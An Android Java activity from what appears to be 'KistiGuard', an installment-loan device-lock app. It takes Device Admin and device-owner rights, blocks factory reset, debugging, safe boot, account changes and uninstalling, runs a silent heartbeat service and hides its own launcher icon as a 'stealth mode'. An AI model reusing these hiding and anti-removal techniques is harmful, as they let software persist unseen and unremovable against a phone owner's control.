package com.kistiguard.client.ui;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.UserManager;
import android.widget.Toast;
import com.kistiguard.client.receiver.KistiDeviceAdminReceiver;
import com.kistiguard.client.service.HeartbeatService;

public class MainActivity extends Activity {

    private static final int REQUEST_CODE_ENABLE_ADMIN = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SharedPreferences prefs = getSharedPreferences("kistiguard_prefs", Context.MODE_PRIVATE);
        boolean isEnrolled = prefs.getBoolean("is_enrolled", false);

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, KistiDeviceAdminReceiver.class);

        // Check if Device Admin / Device Owner is active
        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            // Prompt dealer to activate Device Administrator
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "KistiGuard ডিভাইস প্রোটেকশন সক্রিয় করতে ডিভাইস অ্যাডমিন পারমিশন দিন।");
            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
            return;
        }

        // Apply strict hardware anti-tamper & anti-flashing restrictions if Device Owner
        applyAntiTamperPolicies(dpm, adminComponent);

        // Auto-start silent background heartbeat service
        Intent serviceIntent = new Intent(this, HeartbeatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // If enrolled or requested, completely hide app launcher icon from Home & App Drawer
        prefs.edit().putBoolean("is_enrolled", true).apply();
        Toast.makeText(this, "কিস্তিগার্ড সক্রিয় করা হয়েছে। আইকন অদৃশ্য হচ্ছে...", Toast.LENGTH_LONG).show();

        hideLauncherIcon();
        finish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, KistiDeviceAdminReceiver.class);

            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                applyAntiTamperPolicies(dpm, adminComponent);
                hideLauncherIcon();
                finish();
            } else {
                Toast.makeText(this, "সতর্কতা: ডিভাইস অ্যাডমিন ছাড়া কিস্তি সুরক্ষা কার্যকর হবে না!", Toast.LENGTH_LONG).show();
            }
        }
    }

    /**
     * Apply Device Owner restrictions that block PC Flashing & Factory Reset
     */
    private void applyAntiTamperPolicies(DevicePolicyManager dpm, ComponentName adminComponent) {
        if (dpm == null) return;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && dpm.isDeviceOwnerApp(getPackageName())) {
                // 1. Block Factory Reset from Recovery / Settings
                dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET);

                // 2. Block USB Debugging & Developer Options (PC flashing and ADB exploits blocked)
                dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_DEBUGGING_FEATURES);

                // 3. Block booting into Safe Mode
                dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_SAFE_BOOT);

                // 4. Block modifying device accounts / removing Knox/Google FRP
                dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_MODIFY_ACCOUNTS);

                // 5. Block uninstalling applications
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    dpm.setUninstallBlocked(adminComponent, getPackageName(), true);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Completely hide launcher icon from Home Screen & App Drawer (100% Stealth Mode)
     */
    private void hideLauncherIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
